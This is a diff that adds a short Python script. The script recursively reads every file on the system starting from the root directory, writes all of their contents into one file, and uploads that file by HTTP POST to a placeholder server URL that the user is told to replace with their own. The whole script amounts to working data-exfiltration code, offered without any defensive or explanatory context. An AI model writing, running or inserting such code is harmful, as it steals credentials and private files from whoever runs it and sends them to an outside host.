@@ -1,0 +1,36 @@
+import os
+import requests
+
+def write_data_to_file(output_file):
+    with open(output_file, 'w') as f:
+        for root, dirs, files in os.walk('/'):  # Change '/' to the directory you want to start from
+            for file in files:
+                try:
+                    filepath = os.path.join(root, file)
+                    with open(filepath, 'r', errors='ignore') as current_file:
+                        file_data = current_file.read()
+                        f.write(f"File: {filepath}\n")
+                        f.write(file_data)
+                        f.write('\n\n')
+                except Exception as e:
+                    print(f"Error reading file: {filepath}. Error: {e}")
+
+def send_file_to_server(file_path, url):
+    try:
+        with open(file_path, 'rb') as file:
+            files = {'file': file}
+            response = requests.post(url, files=files)
+            if response.status_code == 200:
+                print("File successfully sent to server.")
+            else:
+                print(f"Error sending file to server. Status code: {response.status_code}")
+    except Exception as e:
+        print(f"Error sending file to server: {e}")
+
+if __name__ == "__main__":
+    output_file = 'all_data.txt'
+    write_data_to_file(output_file)
+    print(f"All data written to {output_file}.")
+
+    server_url = 'http://example.com/upload'  # Replace 'http://example.com/upload' with your server URL
+    send_file_to_server(output_file, server_url)
